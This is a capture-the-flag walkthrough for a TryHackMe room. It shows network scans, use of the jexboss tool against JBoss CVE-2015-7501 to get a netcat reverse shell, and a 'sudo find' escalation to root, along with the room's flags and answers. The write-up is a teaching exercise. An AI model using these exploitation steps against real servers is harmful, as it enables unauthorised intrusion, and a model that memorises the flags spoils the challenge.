## Tony the Tiger - TryHackMe Writeup

[Room Link](https://tryhackme.com/room/tonythetiger)

**IP: 10.10.194.49**

**Replace [YOUR-THM-IP] with your own machine IP assigned by TryHackMe.**

---

## 📌 General Information

**Room Difficulty**: Easy  <br>

**Room Type**: Linux Privilege Escalation, Java Serialization <br>

**Tools Used**: Nmap, Gobuster

**Author**: <br>

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/LOGO%20NEW.png"/>](https://github.com/mauzware)

[TryHackMe Profile](https://tryhackme.com/p/mauzinho) <br>
[GitHub Profile](https://github.com/mauzware)

---

## 🔍 Enumeration

- Nmap and Gobuster for reconnaissance.

  ```
  nmap -sC -sV -T5 -p- 10.10.194.49

  PORT     STATE SERVICE     VERSION
  22/tcp   open  ssh         OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
  | ssh-hostkey: 
  |   1024 d6:97:8c:b9:74:d0:f3:9e:fe:f3:a5:ea:f8:a9:b5:7a (DSA)
  |   2048 33:a4:7b:91:38:58:50:30:89:2d:e4:57:bb:07:bb:2f (RSA)
  |   256 21:01:8b:37:f5:1e:2b:c5:57:f1:b0:42:b7:32:ab:ea (ECDSA)
  |_  256 f6:36:07:3c:3b:3d:71:30:c4:cd:2a:13:00:b5:25:ae (ED25519)
  80/tcp   open  http        Apache httpd 2.4.7 ((Ubuntu))
  |_http-generator: Hugo 0.66.0
  |_http-title: Tony&#39;s Blog
  |_http-server-header: Apache/2.4.7 (Ubuntu)
  1090/tcp open  java-rmi    Java RMI
  |_rmi-dumpregistry: ERROR: Script execution failed (use -d to debug)
  1091/tcp open  java-rmi    Java RMI
  1098/tcp open  java-rmi    Java RMI
  1099/tcp open  java-object Java Object Serialization
  | fingerprint-strings: 
  |   NULL: 
  |     java.rmi.MarshalledObject|
  |     hash[
  |     locBytest
  |     objBytesq
  |     #http://thm-java-deserial.home:8083/q
  |     org.jnp.server.NamingServer_Stub
  |     java.rmi.server.RemoteStub
  |     java.rmi.server.RemoteObject
  |     xpwA
  |     UnicastRef2
  |     thm-java-deserial.home
  |_    ?OXGGeA
  3873/tcp open  java-object Java Object Serialization
  4446/tcp open  java-object Java Object Serialization
  4712/tcp open  msdtc       Microsoft Distributed Transaction Coordinator (error)
  4713/tcp open  pulseaudio?
  | fingerprint-strings: 
  |   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
  |_    126a
  5445/tcp open  smbdirect?
  5455/tcp open  apc-5455?
  5500/tcp open  hotline?
  [SNIP!]
  5501/tcp open  tcpwrapped
  8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
  | ajp-methods: 
  |   Supported methods: GET HEAD POST PUT DELETE TRACE OPTIONS
  |   Potentially risky methods: PUT DELETE TRACE
  |_  See https://nmap.org/nsedoc/scripts/ajp-methods.html
  8080/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
  |_http-server-header: Apache-Coyote/1.1
  | http-methods: 
  |_  Potentially risky methods: PUT DELETE TRACE
  |_http-title: Welcome to JBoss AS
  |_http-open-proxy: Proxy might be redirecting requests
  8083/tcp open  http        JBoss service httpd
  |_http-title: Site doesn't have a title (text/html).
  5 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
  ==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
  [SNIP!]
  Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
  ```

  ```
  gobuster dir -u http://10.10.194.49 -w /usr/share/wordlists/dirb/common.txt
  
  ===============================================================
  Starting gobuster in directory enumeration mode
  ===============================================================
  /.hta                 (Status: 403) [Size: 283]
  /.htaccess            (Status: 403) [Size: 288]
  /.htpasswd            (Status: 403) [Size: 288]
  /categories           (Status: 301) [Size: 316] [--> http://10.10.194.49/categories/]
  /css                  (Status: 301) [Size: 309] [--> http://10.10.194.49/css/]
  /fonts                (Status: 301) [Size: 311] [--> http://10.10.194.49/fonts/]
  /images               (Status: 301) [Size: 312] [--> http://10.10.194.49/images/]
  /index.html           (Status: 200) [Size: 16608]
  /js                   (Status: 301) [Size: 308] [--> http://10.10.194.49/js/]
  /page                 (Status: 301) [Size: 310] [--> http://10.10.194.49/page/]
  /posts                (Status: 301) [Size: 311] [--> http://10.10.194.49/posts/]
  /server-status        (Status: 403) [Size: 292]
  /sitemap.xml          (Status: 200) [Size: 661]
  /tags                 (Status: 301) [Size: 310] [--> http://10.10.194.49/tags/]
  Progress: 4614 / 4615 (99.98%)
  ===============================================================
  Finished
  ===============================================================
  ```
  
- OK, now we have a little map. Per hint in the challenge, first flag should be somewhere in the blogs section. Since there was nothing in source code, I downloaded both pictures and run them through `steghide` but got nothing.
  But there is one more option that will give us the flag and you use it all the time.

  ```
  cat frost.jpg
  [SNIP!]
  THM{Tony_Sure_Loves_Frosted_Flakes}
  ```
  
- Yep, it's `cat`, you can also use `strings`. I also found credentials for admin portal and logged in, but honestly there was nothing much to be found. Let's move to exploitation.

---

## ⚙️ Shell Access

- Task tells us to research `CVE-2015-7501` and find a way to obtain shell, so I did that and found this really cool tool that will give you a reverse shell. You can find it [here](https://github.com/joaomatosf/jexboss.git).

- Tool is pretty easy to use, clone the repo and run it with Python, also install dependencies if needed. Tool has few options and first one didn't work for me at all, then I tried second one with `netcat` and got a reverse shell!

  ```
  git clone https://github.com/joaomatosf/jexboss.git
  cd jexboss
  python jexboss.py -host http://target_host:8080

  nc -lvnp 4444

  python3 jexboss.py -host http://10.10.194.49:8080
   * --- JexBoss: Jboss verify and EXploitation Tool  --- *
   |  * And others Java Deserialization Vulnerabilities * | 
   |                                                      |
   | @author:  João Filho Matos Figueiredo                |
   | @contact: joaomatosf@gmail.com                       |
   |                                                      |
   | @update: https://github.com/joaomatosf/jexboss       |
   #______________________________________________________#
  
   @version: 1.2.4
  
   * Checking for updates in: http://joaomatosf.com/rnp/releases.txt **
  
  
   ** Checking Host: http://10.10.194.49:8080 **
  
   [*] Checking jmx-console:                 
    [ VULNERABLE ]
   [*] Checking web-console:                 
    [ OK ]
   [*] Checking JMXInvokerServlet:           
    [ VULNERABLE ]
   [*] Checking admin-console:               
    [ EXPOSED ]
   [*] Checking Application Deserialization: 
    [ OK ]
   [*] Checking Servlet Deserialization:     
    [ OK ]
   [*] Checking Jenkins:                     
    [ OK ]
   [*] Checking Struts2:                     
    [ OK ]
  
  * Do you want to try to run an automated exploitation via "jmx-console" ?
     If successful, this operation will provide a simple command shell to execute 
     commands on the server..
     Continue only if you have permission!
     yes/NO? no
  
  
   * Do you want to try to run an automated exploitation via "JMXInvokerServlet" ?
     If successful, this operation will provide a simple command shell to execute 
     commands on the server..
     Continue only if you have permission!
     yes/NO? yes
  
   * Sending exploit code to http://10.10.194.49:8080. Please wait...
  
   * Please enter the IP address and tcp PORT of your listening server for try to get a REVERSE SHELL.
     OBS: You can also use the --cmd "command" to send specific commands to run on the server.
     IP Address (RHOST): [YOUR-THM-IP]
     Port (RPORT): 4444
  
   * The exploit code was successfully sent. Check if you received the reverse shell
     connection on your server or if your command was executed. 
     Type [ENTER] to continue...

  nc -lvnp 4444                    
  listening on [any] 4444 ...
  connect to [YOUR-THM-IP] from (UNKNOWN) [10.10.194.49] 35720
  bash: cannot set terminal process group (820): Inappropriate ioctl for device
  bash: no job control in this shell
  cmnatic@thm-java-deserial:/$ whoami
  whoami
  cmnatic
  cmnatic@thm-java-deserial:/$ 
  ```
  
- I had to put my baby putty shell in action as well then started looking for last two flags.

---

## 🧍 User Privilege Escalation

- This is one self-explained, it's in the `/home/jboss`.

  ```
  cmnatic@thm-java-deserial:/home/jboss$ cat .jboss.txt 
  THM{50c10ad46b5793704601ecdad865eb06}
  ```
  
- Now it's escalation time!

---

## 👑 Root Privilege Escalation

- There is another file in `/home/jboss` named `note`, read it.

  ```
  cmnatic@thm-java-deserial:/home/jboss$ cat note 
  Hey JBoss!
  
  Following your email, I have tried to replicate the issues you were having with the system.
  
  However, I don't know what commands you executed - is there any file where this history is stored that I can access?
  
  Oh! I almost forgot... I have reset your password as requested (make sure not to tell it to anyone!)
  
  Password: likeaboss
  
  Kind Regards,
  CMNatic
  ```
  
- OK, awesome, now we have credentials of user `jboss`, switch to that user and use `sudo -l` for final part of exploitation.

  ```
  cmnatic@thm-java-deserial:/home/jboss$ su jboss
  Password: 
  jboss@thm-java-deserial:~$ id
  uid=1001(jboss) gid=1001(jboss) groups=1001(jboss)
  
  jboss@thm-java-deserial:~$ sudo -l
  Matching Defaults entries for jboss on thm-java-deserial:
      env_reset, mail_badpass,
      secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
  
  User jboss may run the following commands on thm-java-deserial:
      (ALL) NOPASSWD: /usr/bin/find
  ```
  
- There is a one liner that will give you root, you can find it on GTFOBins. Use it then read the last flag.

  ```
  jboss@thm-java-deserial:~$ sudo find . -exec /bin/sh \; -quit
  # whoami
  root
  
  # cat /root/root.txt
  QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==
  ```

- Do a little bit of decoding and you should get final flag. First decode this Base64 string then crack the MD5 string and it's done.

  ```
  echo 'QkM3N0FDMDcyRUUzMEUzNzYwODA2ODY0RTIzNEM3Q0Y==' | base64 -d
  BC77AC072EE30E3760806864E234C7CF

  BC77AC072EE30E3760806864E234C7CF (MD5) 
  zxcvbnm123456789
  ```

---

## 🏁 Flags

- **Tony's flag**: `THM{Tony_Sure_Loves_Frosted_Flakes}`
- **User Flag**: `THM{50c10ad46b5793704601ecdad865eb06}`
- **Root Flag**: `zxcvbnm123456789`

---

## 💬 Notes & Reflections

- What was challenging in this room for me?
  `Some parts of exploitation but nothing that little bit of googling will resolve`

- What did I learn?
  `New tool, new CVE, new exploits!`

- I would recommend this room or any type of CTF challenge to every Cyber Security enthusiast since it will sharpen your skills better than any book/tutorial/course or walkthrough rooms on many different platforms!

- Thank you for reading! Enjoy, Have Fun and Happy Hacking! 🤟

---
